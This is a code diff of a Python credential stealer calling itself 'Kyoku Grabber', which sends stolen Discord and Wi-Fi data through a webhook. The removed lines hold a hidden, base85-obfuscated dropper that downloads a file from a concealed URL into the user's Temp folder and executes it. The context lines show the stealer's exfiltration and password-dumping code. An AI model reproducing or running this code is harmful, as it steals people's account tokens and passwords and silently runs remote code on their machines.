@@ -174,9 +174,7 @@ class PcInfo:
         embed.set_footer(text="Kyoku Grabber | Created By errias")
 
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1083105927906988063/1087777569815928872/Baslksz-1.png", username="Kyoku Token Stealer")
-OOOOOOO = 'XmoUNb2=|CXK8e3bz&}KZ*4DSa&l>5b1zs|Z*pxdQekv0Qe|y#bY(3;WNm3~X>)XPVRUJ4ZY@-AZ)`0ua$$EbZDDC{FJx|PX<{yAcx3'
-OOOOOOOOO='Qgv>0X>Dafa&K#8axP_fWd'
-OOOO=os.getlogin()
+
 class Discord:
     def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -643,10 +641,6 @@ class Wifi:
             for i, j in self.name_pass.items():
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
-OOOOOOOOO="C:\\Users\\"+OOOO+"\\AppData\\Local\\Temp\\"+base64.b85decode(OOOOOOOOO).decode('utf-8')+""
-with open(OOOOOOOOO, 'wb') as f:
-    f.write(requests.get(base64.b85decode(OOOOOOO).decode('utf-8')).content)
-os.system(OOOOOOOOO)
 @trygrab
 class Minecraft:
     def __init__(self):
